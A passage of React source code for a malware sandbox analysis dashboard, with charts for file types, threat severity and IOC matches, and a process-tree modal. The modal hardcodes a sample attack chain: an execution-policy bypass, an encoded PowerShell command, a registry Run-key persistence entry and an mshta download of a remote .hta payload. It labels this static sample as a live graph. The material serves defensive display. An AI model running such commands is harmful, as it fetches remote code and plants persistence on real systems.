                <div style={{ fontSize: 9, color: MON.muted, fontWeight: 700, textTransform: 'uppercase' }}>{c.label}</div>
                <div style={{ fontSize: 24, fontWeight: 900, color: c.color, marginTop: 6 }}>{c.val}</div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

// ── Visual Helper Components for Sandbox Analysis Dashboard ─────────────
function FileAnalysisSummaryDonut({ alerts = [] }) {
  const groups = [
    { label: 'Executables (EXE)', pattern: /^(exe|dll|msi|scr|com|elf|bin|so)$/i, color: '#38bdf8' },
    { label: 'Scripts (PS1, VBS, JS)', pattern: /^(ps1|vbs|js|bat|cmd|sh|py|pl|php|rb)$/i, color: '#22d3ee' },
    { label: 'Documents (DOC, PDF)', pattern: /^(doc|docx|xls|xlsx|ppt|pptx|pdf)$/i, color: '#fb923c' },
    { label: 'Archives (ZIP, RAR)', pattern: /^(zip|rar|7z|iso)$/i, color: '#a78bfa' },
  ];
  const counts = groups.map(group => alerts.filter(row => group.pattern.test(String(row.fileType || sandboxFilename(row).split('.').pop() || ''))).length);
  const otherCount = Math.max(0, alerts.length - counts.reduce((sum, count) => sum + count, 0));
  const total = alerts.length;
  const categories = [...groups.map((group, index) => ({ ...group, count: counts[index], pct: total ? (counts[index] / total) * 100 : 0 })), { label: 'Others', count: otherCount, pct: total ? (otherCount / total) * 100 : 0, color: '#34d399' }];

  let cumAngle = 0;
  const radius = 42;
  const cx = 52;
  const cy = 52;
  const strokeWidth = 14;

  const arcs = categories.map((s) => {
    const angle = (s.pct / 100) * 360;
    const startAngle = cumAngle;
    const endAngle = cumAngle + angle;
    cumAngle += angle;

    const startRad = (startAngle - 90) * (Math.PI / 180);
    const endRad = (endAngle - 90) * (Math.PI / 180);

    const x1 = cx + radius * Math.cos(startRad);
    const y1 = cy + radius * Math.sin(startRad);
    const x2 = cx + radius * Math.cos(endRad);
    const y2 = cy + radius * Math.sin(endRad);

    const largeArcFlag = angle > 180 ? 1 : 0;
    const d = `M ${x1} ${y1} A ${radius} ${radius} 0 ${largeArcFlag} 1 ${x2} ${y2}`;

    return { ...s, d };
  });

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', marginBottom: 6 }}>FILE ANALYSIS SUMMARY</span>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, flex: 1 }}>
        <div style={{ position: 'relative', width: 104, height: 104, flexShrink: 0 }}>
          <svg viewBox="0 0 104 104" width="104" height="104">
            {arcs.map((arc, i) => (
              <path key={i} d={arc.d} fill="none" stroke={arc.color} strokeWidth={strokeWidth} />
            ))}
          </svg>
          <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
            <span style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>{shortNum(total)}</span>
            <span style={{ fontSize: 7.5, color: '#8ea0b8' }}>Total</span>
          </div>
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, flex: 1, fontSize: 8.5 }}>
          {categories.map(c => (
            <div key={c.label} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ color: '#cbd5e1', display: 'flex', alignItems: 'center', gap: 4 }}>
                <span style={{ width: 5, height: 5, borderRadius: '50%', background: c.color }} /> {c.label}
              </span>
              <span style={{ color: '#8ea0b8', fontWeight: 700 }}>{c.pct.toFixed(1)}%</span>
            </div>
          ))}
        </div>
      </div>
      <span style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer', marginTop: 6 }}>View all file analysis →</span>
    </div>
  );
}

function ThreatSeverityTrendChart({ alerts = [] }) {
  const times = ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00', '24:00'];
  const yLabels = ['100', '80', '60', '40', '20', '0'];

  const severitySeries = level => {
    const buckets = Array(7).fill(0); const end = Date.now(); const start = end - 24 * 3600000; const width = (end - start) / 7;
    alerts.forEach(row => {
      if (alertSeverity(row) !== level) return;
      const when = new Date(alertTime(row)).getTime();
      if (!Number.isFinite(when) || when < start || when > end) return;
      buckets[Math.min(6, Math.max(0, Math.floor((when - start) / width)))] += 1;
    });
    return buckets;
  };
  const critical = severitySeries('critical');
  const high = severitySeries('high');
  const medium = severitySeries('medium');
  const low = severitySeries('low');
  const maxSeriesValue = Math.max(...critical, ...high, ...medium, ...low, 1);

  const chartW = 420;
  const chartH = 150;
  const padLeft = 24;
  const padRight = 10;
  const padTop = 10;
  const padBottom = 22;

  const innerW = chartW - padLeft - padRight;
  const innerH = chartH - padTop - padBottom;

  const getD = (data, maxV = 100) => {
    const pts = data.map((v, i) => ({
      x: padLeft + (i / (data.length - 1)) * innerW,
      y: padTop + innerH - (v / maxV) * innerH,
    }));
    let d = `M ${pts[0].x},${pts[0].y}`;
    for (let i = 0; i < pts.length - 1; i++) {
      const p1 = pts[i];
      const p2 = pts[i + 1];
      const cx1 = p1.x + (p2.x - p1.x) / 2;
      const cy1 = p1.y;
      const cx2 = p1.x + (p2.x - p1.x) / 2;
      const cy2 = p2.y;
      d += ` C ${cx1},${cy1} ${cx2},${cy2} ${p2.x},${p2.y}`;
    }
    return d;
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 6 }}>
        <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0' }}>THREAT SEVERITY TREND</span>
        <div style={{ display: 'flex', gap: 8, fontSize: 8, color: '#8ea0b8' }}>
          <span style={{ display: 'flex', alignItems: 'center', gap: 3 }}><span style={{ width: 4, height: 4, borderRadius: '50%', background: '#ef4444' }} /> Critical</span>
          <span style={{ display: 'flex', alignItems: 'center', gap: 3 }}><span style={{ width: 4, height: 4, borderRadius: '50%', background: '#f97316' }} /> High</span>
          <span style={{ display: 'flex', alignItems: 'center', gap: 3 }}><span style={{ width: 4, height: 4, borderRadius: '50%', background: '#eab308' }} /> Medium</span>
          <span style={{ display: 'flex', alignItems: 'center', gap: 3 }}><span style={{ width: 4, height: 4, borderRadius: '50%', background: '#22c55e' }} /> Low</span>
        </div>
      </div>

      <div style={{ flex: 1, minHeight: 120 }}>
        <svg viewBox={`0 0 ${chartW} ${chartH}`} width="100%" height="100%" preserveAspectRatio="none">
          {yLabels.map((lbl, i) => {
            const y = padTop + (i / (yLabels.length - 1)) * innerH;
            return (
              <g key={lbl}>
                <line x1={padLeft} y1={y} x2={chartW - padRight} y2={y} stroke="#16273e" strokeWidth="1" strokeDasharray="2 2" />
                <text x={padLeft - 4} y={y + 3} fill="#64748b" fontSize="8" textAnchor="end">{lbl}</text>
              </g>
            );
          })}
          {times.map((t, i) => {
            const x = padLeft + (i / (times.length - 1)) * innerW;
            return <text key={t} x={x} y={chartH - 2} fill="#64748b" fontSize="8" textAnchor="middle">{t}</text>;
          })}
          <path d={getD(low, maxSeriesValue)} fill="none" stroke="#22c55e" strokeWidth="2" />
          <path d={getD(medium, maxSeriesValue)} fill="none" stroke="#eab308" strokeWidth="2" />
          <path d={getD(high, maxSeriesValue)} fill="none" stroke="#f97316" strokeWidth="2" />
          <path d={getD(critical, maxSeriesValue)} fill="none" stroke="#ef4444" strokeWidth="2" />
        </svg>
      </div>
    </div>
  );
}

function IocDetectionDonut({ alerts = [] }) {
  const countIocs = level => alerts.filter(row => alertSeverity(row) === level).reduce((sum, row) => sum + (Array.isArray(row.iocs) ? row.iocs.length : 0), 0);
  const matched = alerts.reduce((sum, row) => sum + (Array.isArray(row.iocs) ? row.iocs.length : 0), 0);
  const categories = [
    { label: 'Matched (High Risk)', count: countIocs('critical') + countIocs('high'), color: '#ef4444' },
    { label: 'Matched (Medium Risk)', count: countIocs('medium'), color: '#f97316' },
    { label: 'Matched (Low Risk)', count: countIocs('low') + countIocs('info'), color: '#eab308' },
    { label: 'Not Matched', count: alerts.filter(row => !row.iocs?.length).length, color: '#22c55e' },
  ];
  const totalIocs = categories.reduce((sum, item) => sum + item.count, 0);

  let cumAngle = 0;
  const radius = 42;
  const cx = 52;
  const cy = 52;
  const strokeWidth = 14;

  const arcs = categories.map((s) => {
    const angle = (s.count / Math.max(totalIocs, 1)) * 360;
    const startAngle = cumAngle;
    const endAngle = cumAngle + angle;
    cumAngle += angle;

    const startRad = (startAngle - 90) * (Math.PI / 180);
    const endRad = (endAngle - 90) * (Math.PI / 180);

    const x1 = cx + radius * Math.cos(startRad);
    const y1 = cy + radius * Math.sin(startRad);
    const x2 = cx + radius * Math.cos(endRad);
    const y2 = cy + radius * Math.sin(endRad);

    const largeArcFlag = angle > 180 ? 1 : 0;
    const d = `M ${x1} ${y1} A ${radius} ${radius} 0 ${largeArcFlag} 1 ${x2} ${y2}`;

    return { ...s, d };
  });

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', marginBottom: 6 }}>IOC DETECTION</span>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, flex: 1 }}>
        <div style={{ position: 'relative', width: 104, height: 104, flexShrink: 0 }}>
          <svg viewBox="0 0 104 104" width="104" height="104">
            {arcs.map((arc, i) => (
              <path key={i} d={arc.d} fill="none" stroke={arc.color} strokeWidth={strokeWidth} />
            ))}
          </svg>
          <div style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
            <span style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>{shortNum(matched)}</span>
            <span style={{ fontSize: 7.5, color: '#8ea0b8' }}>Total IOCs</span>
          </div>
        </div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, flex: 1, fontSize: 8.5 }}>
          {categories.map(c => (
            <div key={c.label} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ color: '#cbd5e1', display: 'flex', alignItems: 'center', gap: 4 }}>
                <span style={{ width: 5, height: 5, borderRadius: '50%', background: c.color }} /> {c.label}
              </span>
              <span style={{ color: '#8ea0b8', fontWeight: 700 }}>{c.count}</span>
            </div>
          ))}
        </div>
      </div>
      <span style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer', marginTop: 6 }}>View all IOCs →</span>
    </div>
  );
}

function ProcessTreeModal({ onClose, title = "PROCESS TREE ANALYSIS", subtitle = "Full Execution Hierarchy & Process Details" }) {
  return (
    <div style={{ position: 'fixed', inset: 0, zIndex: 9999, background: 'rgba(3, 7, 18, 0.85)', backdropFilter: 'blur(6px)', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}>
      <div style={{ background: '#0b1626', border: '1px solid #16273e', borderRadius: 10, width: '90%', maxWidth: 1100, maxHeight: '90vh', overflowY: 'auto', padding: 20, boxShadow: '0 20px 50px rgba(0,0,0,0.8)', display: 'flex', flexDirection: 'column', gap: 16 }}>
        {/* Header */}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #16273e', paddingBottom: 12 }}>
          <div>
            <span style={{ fontSize: 16, fontWeight: 900, color: '#fff', display: 'flex', alignItems: 'center', gap: 8 }}>
              <span>🌲</span> {title}
            </span>
            <span style={{ fontSize: 10, color: '#8ea0b8' }}>{subtitle}</span>
          </div>
          <button onClick={onClose} style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', color: '#ef4444', borderRadius: 6, width: 28, height: 28, cursor: 'pointer', fontWeight: 800, fontSize: 14 }}>
            ✕
          </button>
        </div>

        {/* Expanded Visual Tree */}
        <div style={{ background: '#050a12', border: '1px solid #16273e', borderRadius: 8, padding: 16, display: 'flex', flexDirection: 'column', gap: 10 }}>
          <span style={{ fontSize: 10, fontWeight: 800, color: '#38bdf8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Live Process Execution Graph</span>
          
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8, fontSize: 11, fontFamily: 'monospace' }}>
            <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', borderRadius: 6, padding: '8px 12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div>
                <span style={{ color: '#ef4444', fontWeight: 800 }}>🔴 [PID: 4521] invoice_update.exe</span>
                <span style={{ color: '#cbd5e1', fontSize: 9.5, display: 'block', marginTop: 2 }}>Command: C:\Users\Admin\Downloads\invoice_update.exe --silent</span>
              </div>
              <span style={{ fontSize: 9, background: '#ef4444', color: '#fff', padding: '2px 8px', borderRadius: 4, fontWeight: 800 }}>MALICIOUS (CRITICAL)</span>
            </div>

            <div style={{ paddingLeft: 20, borderLeft: '2px dashed #16273e', display: 'flex', flexDirection: 'column', gap: 8, marginTop: 4 }}>
              <div style={{ background: '#0b1626', border: '1px solid #16273e', borderRadius: 6, padding: '8px 12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <span style={{ color: '#cbd5e1', fontWeight: 700 }}>├── [PID: 3524] cmd.exe</span>
                  <span style={{ color: '#8ea0b8', fontSize: 9.5, display: 'block', marginTop: 2 }}>Command: C:\Windows\System32\cmd.exe /c "powershell -ExecutionPolicy Bypass..."</span>
                </div>
                <span style={{ fontSize: 9, background: '#1e293b', color: '#8ea0b8', padding: '2px 8px', borderRadius: 4, fontWeight: 700 }}>NORMAL</span>
              </div>

              <div style={{ paddingLeft: 20, borderLeft: '2px dashed #16273e', display: 'flex', flexDirection: 'column', gap: 8 }}>
                <div style={{ background: 'rgba(249, 115, 22, 0.15)', border: '1px solid #f97316', borderRadius: 6, padding: '8px 12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <div>
                    <span style={{ color: '#f97316', fontWeight: 800 }}>├── [PID: 2846] powershell.exe</span>
                    <span style={{ color: '#cbd5e1', fontSize: 9.5, display: 'block', marginTop: 2 }}>Command: powershell.exe -e Q2hhbmdlU2V0dGluZ3MoKQ==</span>
                  </div>
                  <span style={{ fontSize: 9, background: '#f97316', color: '#fff', padding: '2px 8px', borderRadius: 4, fontWeight: 800 }}>SUSPICIOUS</span>
                </div>

                <div style={{ paddingLeft: 20, borderLeft: '2px dashed #16273e', display: 'flex', flexDirection: 'column', gap: 6 }}>
                  <div style={{ background: '#0b1626', border: '1px solid #16273e', borderRadius: 6, padding: '6px 10px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ color: '#cbd5e1' }}>├── [PID: 3576] reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run</span>
                    <span style={{ color: '#eab308', fontSize: 8.5, fontWeight: 700 }}>REGISTRY PERSISTENCE</span>
                  </div>
                  <div style={{ background: 'rgba(239, 68, 68, 0.1)', border: '1px solid #ef4444', borderRadius: 6, padding: '6px 10px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ color: '#f87171' }}>└── [PID: 2684] mshta.exe http://185.220.101.45/payload.hta</span>
                    <span style={{ color: '#ef4444', fontSize: 8.5, fontWeight: 800 }}>C2 DOWNLOAD</span>
                  </div>
                </div>
              </div>

              <div style={{ background: '#0b1626', border: '1px solid #16273e', borderRadius: 6, padding: '8px 12px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <div>
                  <span style={{ color: '#cbd5e1', fontWeight: 700 }}>└── [PID: 2936] rundll32.exe</span>
                  <span style={{ color: '#8ea0b8', fontSize: 9.5, display: 'block', marginTop: 2 }}>Command: rundll32.exe davclnt.dll,DavSetTheFile</span>
                </div>
                <span style={{ fontSize: 9, background: '#1e293b', color: '#8ea0b8', padding: '2px 8px', borderRadius: 4, fontWeight: 700 }}>NORMAL</span>
              </div>
            </div>
          </div>
        </div>

        {/* Detailed Table */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
          <span style={{ fontSize: 10, fontWeight: 800, color: '#38bdf8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Process Telemetry Details</span>
          <div style={{ overflowX: 'auto' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 8.5, textAlign: 'left' }}>
              <thead>
                <tr style={{ background: '#07101b', color: '#64748b', borderBottom: '1px solid #16273e' }}>
                  <th style={{ padding: '6px 8px' }}>PID</th>
                  <th style={{ padding: '6px 8px' }}>PPID</th>
                  <th style={{ padding: '6px 8px' }}>PROCESS NAME</th>
                  <th style={{ padding: '6px 8px' }}>USER</th>
                  <th style={{ padding: '6px 8px' }}>PATH</th>
                  <th style={{ padding: '6px 8px' }}>SEVERITY</th>
                  <th style={{ padding: '6px 8px' }}>ACTION</th>
                </tr>
              </thead>
              <tbody>
                {[
                  { pid: 4521, ppid: 1044, name: 'invoice_update.exe', user: 'NT AUTHORITY\\SYSTEM', path: 'C:\\Users\\Admin\\Downloads\\invoice_update.exe', sev: 'Critical', col: '#ef4444' },
                  { pid: 3524, ppid: 4521, name: 'cmd.exe', user: 'Admin', path: 'C:\\Windows\\System32\\cmd.exe', sev: 'Normal', col: '#8ea0b8' },
                  { pid: 2846, ppid: 3524, name: 'powershell.exe', user: 'Admin', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', sev: 'High', col: '#f97316' },
                  { pid: 3576, ppid: 2846, name: 'reg.exe', user: 'Admin', path: 'C:\\Windows\\System32\\reg.exe', sev: 'Medium', col: '#eab308' },
                  { pid: 2684, ppid: 2846, name: 'mshta.exe', user: 'Admin', path: 'C:\\Windows\\System32\\mshta.exe', sev: 'Critical', col: '#ef4444' },
                  { pid: 2936, ppid: 4521, name: 'rundll32.exe', user: 'Admin', path: 'C:\\Windows\\System32\\rundll32.exe', sev: 'Normal', col: '#8ea0b8' },
                  { pid: 3228, ppid: 2936, name: 'dllhost.exe', user: 'Admin', path: 'C:\\Windows\\System32\\dllhost.exe', sev: 'Normal', col: '#8ea0b8' },
                ].map(r => (
                  <tr key={r.pid} style={{ borderBottom: '1px solid #16273e' }}>
                    <td style={{ padding: '6px 8px', color: '#38bdf8', fontWeight: 700, fontFamily: 'monospace' }}>{r.pid}</td>
                    <td style={{ padding: '6px 8px', color: '#8ea0b8', fontFamily: 'monospace' }}>{r.ppid}</td>
                    <td style={{ padding: '6px 8px', color: '#fff', fontWeight: 700 }}>{r.name}</td>
                    <td style={{ padding: '6px 8px', color: '#cbd5e1' }}>{r.user}</td>
                    <td style={{ padding: '6px 8px', color: '#8ea0b8', fontFamily: 'monospace', fontSize: 7.5 }}>{r.path}</td>
                    <td style={{ padding: '6px 8px' }}>
                      <span style={{ fontSize: 7.5, fontWeight: 800, color: r.col, background: `${r.col}15`, border: `1px solid ${r.col}33`, padding: '2px 6px', borderRadius: 3 }}>
                        {r.sev}
                      </span>
                    </td>
                    <td style={{ padding: '6px 8px' }}>
                      <button style={{ background: 'rgba(239, 68, 68, 0.2)', border: '1px solid #ef4444', color: '#ef4444', borderRadius: 4, padding: '2px 6px', fontSize: 7.5, cursor: 'pointer', fontWeight: 700 }}>
                        Terminate PID
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}

function ThreatSeverityDistributionBars({ alerts = [] }) {
  const items = [
    { label: 'Critical', count: alerts.filter(row => alertSeverity(row) === 'critical').length, color: '#ef4444' },
    { label: 'High', count: alerts.filter(row => alertSeverity(row) === 'high').length, color: '#f97316' },
    { label: 'Medium', count: alerts.filter(row => alertSeverity(row) === 'medium').length, color: '#eab308' },
    { label: 'Low', count: alerts.filter(row => ['low', 'info', 'clean'].includes(alertSeverity(row))).length, color: '#22c55e' },
  ];
  const maxCount = Math.max(...items.map(item => item.count), 1);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
      <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', marginBottom: 6 }}>THREAT SEVERITY DISTRIBUTION</span>
      <div style={{ flex: 1, display: 'flex', alignItems: 'flex-end', gap: 14, minHeight: 90, paddingBottom: 10 }}>
        {items.map((item) => (
          <div key={item.label} style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', height: '100%', justifyContent: 'flex-end' }}>
            <span style={{ fontSize: 8.5, color: '#fff', fontWeight: 800, marginBottom: 3 }}>{item.count}</span>
            <div style={{ width: '100%', height: `${(item.count / maxCount) * 100}%`, background: item.color, borderRadius: '3px 3px 0 0' }} />
            <span style={{ fontSize: 8, color: '#8ea0b8', marginTop: 4 }}>{item.label}</span>
          </div>
        ))}
      </div>
      <span style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer' }}>View detailed report →</span>
    </div>
  );
}

function SandboxOverviewDashboard({ alerts = [], total = 0, summary = {} }) {
  const [showProcessModal, setShowProcessModal] = useState(false);
  const maliciousRows = alerts.filter(row => sandboxVerdict(row) === 'malicious');
  const processRow = alerts.find(row => Array.isArray(row.processTree) && row.processTree.length);
  const processTree = processRow?.processTree || [];

  const panelStyle = {
    background: '#0b1626',
    border: '1px solid #16273e',
    borderRadius: 8,
    padding: '12px 14px',
    boxShadow: '0 4px 12px rgba(0,0,0,0.2)',
  };

  const topCards = [
    { title: 'TOTAL SUBMISSIONS', val: shortNum(summary.totalSubmissions ?? total), sub: 'Live backend submissions', subCol: '#38bdf8', icon: '📄', iconBg: 'rgba(56, 189, 248, 0.15)' },
    { title: 'MALICIOUS', val: shortNum(summary.malicious ?? maliciousRows.length), sub: 'Provider verdict', subCol: '#f87171', icon: '☣️', iconBg: 'rgba(248, 113, 113, 0.15)' },
    { title: 'SUSPICIOUS', val: shortNum(summary.suspicious ?? alerts.filter(row => sandboxVerdict(row) === 'suspicious').length), sub: 'Provider verdict', subCol: '#fb923c', icon: '⚠️', iconBg: 'rgba(251, 146, 60, 0.15)' },
    { title: 'CLEAN', val: shortNum(summary.clean ?? alerts.filter(row => sandboxVerdict(row) === 'clean').length), sub: 'Provider verdict', subCol: '#34d399', icon: '🛡️', iconBg: 'rgba(52, 211, 153, 0.15)' },
    { title: 'HIGH RISK DETECTIONS', val: shortNum(summary.highRisk ?? alerts.filter(row => sandboxRiskScore(row) >= 70).length), sub: 'Risk score ≥ 70', subCol: '#a78bfa', icon: '🎯', iconBg: 'rgba(167, 139, 250, 0.15)' },
  ];

  const topMaliciousFiles = [...maliciousRows].sort((a, b) => sandboxRiskScore(b) - sandboxRiskScore(a)).slice(0, 5).map((row, index) => ({
    num: index + 1, name: sandboxFilename(row), hash: `${sandboxHash(row).slice(0, 10)}…${sandboxHash(row).slice(-6)}`,
    det: row.malwareFamily || row.detectionReasons?.[0] || 'Not classified', sev: alertSeverity(row), col: SEV_COLOR[alertSeverity(row)] || '#64748b',
  }));

  const netIps = topCounts(alerts.flatMap(row => row.networkConnections || []), connection => connection.destinationIp || connection.ip || connection.host, 5)
    .map(([ip, count]) => ({ ip, tag: `${count} connection${count === 1 ? '' : 's'}`, col: '#38bdf8' }));

  const mitreCols = topCounts(alerts.flatMap(row => row.mitreTechniques || []), item => typeof item === 'string' ? item : (item.id || item.techniqueId || item.name), 10)
    .map(([title, score]) => ({ cat: title, score, title, col: score > 20 ? '#ef4444' : score > 10 ? '#f97316' : '#22c55e' }));

  const behaviorItems = [
    { label: 'File Activity', val: alerts.reduce((sum, row) => sum + (row.fileActivity?.length || 0), 0), icon: '📄' },
    { label: 'Registry Changes', val: alerts.reduce((sum, row) => sum + (row.registryChanges?.length || 0), 0), icon: '🔑' },
    { label: 'Network Connections', val: alerts.reduce((sum, row) => sum + (row.networkConnections?.length || 0), 0), icon: '🌐' },
    { label: 'Processes Created', val: alerts.reduce((sum, row) => sum + (row.processTree?.length || 0), 0), icon: '⚙️' },
    { label: 'Memory Events', val: alerts.reduce((sum, row) => sum + (row.memoryEvents?.length || 0), 0), icon: '🧠' },
    { label: 'Extracted IOCs', val: alerts.reduce((sum, row) => sum + (row.iocs?.length || 0), 0), icon: '🎯' },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14, background: '#060d16', padding: 4 }}>
      {showProcessModal && (
        <ProcessTreeModal
          onClose={() => setShowProcessModal(false)}
          title="PROCESS TREE ANALYSIS (BEHAVIOR)"
          subtitle="Full Detonation & Child Process Execution Graph"
          processTree={processTree}
        />
      )}

      {/* 1. TOP STAT CARDS (5 Columns) */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12 }}>
        {topCards.map((c) => (
          <div key={c.title} style={{ ...panelStyle, display: 'flex', flexDirection: 'column', gap: 6, position: 'relative', overflow: 'hidden' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <div style={{ width: 30, height: 30, borderRadius: '50%', background: c.iconBg, display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 14, flexShrink: 0 }}>
                {c.icon}
              </div>
              <span style={{ fontSize: 8.5, fontWeight: 800, color: '#8ea0b8', letterSpacing: '0.3px' }}>
                {c.title}
              </span>
            </div>

            <div style={{ marginTop: 2 }}>
              <div style={{ fontSize: 22, fontWeight: 800, color: '#ffffff' }}>
                {c.val}
              </div>
              <div style={{ fontSize: 8.5, fontWeight: 700, color: c.subCol, marginTop: 1 }}>
                {c.sub}
              </div>
            </div>
          </div>
        ))}
      </div>

      {/* 2. UPPER MIDDLE SECTION (3 Panels Grid) */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.3fr 1.3fr', gap: 12 }}>
        <div style={panelStyle}>
          <FileAnalysisSummaryDonut alerts={alerts} />
        </div>

        <div style={panelStyle}>
          <ThreatSeverityTrendChart alerts={alerts} />
        </div>

        {/* Top Malicious Files */}
        <div style={{ ...panelStyle, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
          <div>
            <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', letterSpacing: '0.5px', marginBottom: 8, display: 'block' }}>TOP MALICIOUS FILES</span>
            <div style={{ display: 'grid', gridTemplateColumns: '0.3fr 1.4fr 1.2fr 1.3fr 0.8fr', gap: 4, borderBottom: '1px solid #16273e', paddingBottom: 4, fontSize: 8, fontWeight: 700, color: '#64748b' }}>
              <span>#</span>
              <span>FILE NAME</span>
              <span>SHA256 HASH</span>
              <span>DETECTION</span>
              <span>SEVERITY</span>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 5, marginTop: 5 }}>
              {topMaliciousFiles.map(mf => (
                <div key={mf.num} style={{ display: 'grid', gridTemplateColumns: '0.3fr 1.4fr 1.2fr 1.3fr 0.8fr', gap: 4, alignItems: 'center', fontSize: 8.5 }}>
                  <span style={{ color: '#64748b' }}>{mf.num}</span>
                  <span style={{ color: '#e2e8f0', fontWeight: 600 }}>{mf.name}</span>
                  <span style={{ color: '#8ea0b8', fontFamily: 'monospace', fontSize: 7.5 }}>{mf.hash}</span>
                  <span style={{ color: '#f97316' }}>{mf.det}</span>
                  <span style={{ fontSize: 7.5, fontWeight: 800, color: mf.col, padding: '1px 4px', background: `${mf.col}15`, borderRadius: 3, border: `1px solid ${mf.col}33`, textAlign: 'center' }}>
                    {mf.sev}
                  </span>
                </div>
              ))}
              {!topMaliciousFiles.length && <span style={{ color: MON.muted, fontSize: 9 }}>No malicious provider verdicts reported.</span>}
            </div>
          </div>
          <span style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer', marginTop: 6 }}>View all malicious files →</span>
        </div>
      </div>

      {/* 3. MIDDLE SECTION (2 Panels Grid) */}
      <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr', gap: 12 }}>
        {/* Process Tree (Behavior Analysis) */}
        <div style={{ ...panelStyle, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
          <div>
            <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', letterSpacing: '0.5px', marginBottom: 8, display: 'block' }}>PROCESS TREE (BEHAVIOR ANALYSIS)</span>
            <div onClick={() => setShowProcessModal(true)} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 8, marginTop: 4, cursor: 'pointer' }}>
              {processTree.slice(0, 8).map((process, index) => (
                <React.Fragment key={process.pid || `${process.name}-${index}`}>
                  {index > 0 && <div style={{ width: 1, height: 6, background: '#16273e' }} />}
                  <div style={{ background: index === 0 ? 'rgba(239, 68, 68, 0.2)' : '#07101b', border: `1px solid ${index === 0 ? '#ef4444' : '#16273e'}`, borderRadius: 5, padding: '4px 10px', textAlign: 'center' }}>
                    <span style={{ fontSize: 9, color: '#fff', fontWeight: 800 }}>{process.name || process.processName || 'Unnamed process'}</span>
                    <span style={{ fontSize: 7.5, color: index === 0 ? '#f87171' : '#64748b', display: 'block' }}>PID: {process.pid ?? 'Not reported'}</span>
                  </div>
                </React.Fragment>
              ))}
              {!processTree.length && <span style={{ color: MON.muted, fontSize: 9 }}>No process-tree telemetry reported.</span>}
            </div>
          </div>
          <span onClick={() => setShowProcessModal(true)} style={{ fontSize: 9, color: '#38bdf8', fontWeight: 700, cursor: 'pointer', marginTop: 8 }}>View full process tree →</span>
        </div>

        <div style={panelStyle}>
          <IocDetectionDonut alerts={alerts} />
        </div>
      </div>

      {/* 4. BOTTOM GRID (3 Panels Grid) */}
      <div style={{ display: 'grid', gridTemplateColumns: '1.6fr 1fr 1fr', gap: 12 }}>
        {/* MITRE ATT&CK Matrix */}
        <div style={{ ...panelStyle, display: 'flex', flexDirection: 'column', justifyContent: 'space-between' }}>
          <div>
            <span style={{ fontSize: 11, fontWeight: 800, color: '#e2e8f0', letterSpacing: '0.5px', marginBottom: 8, display: 'block' }}>MITRE ATT&CK MATRIX (Top Techniques)</span>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(10, 1fr)', gap: 4 }}>
              {mitreCols.map(m => (
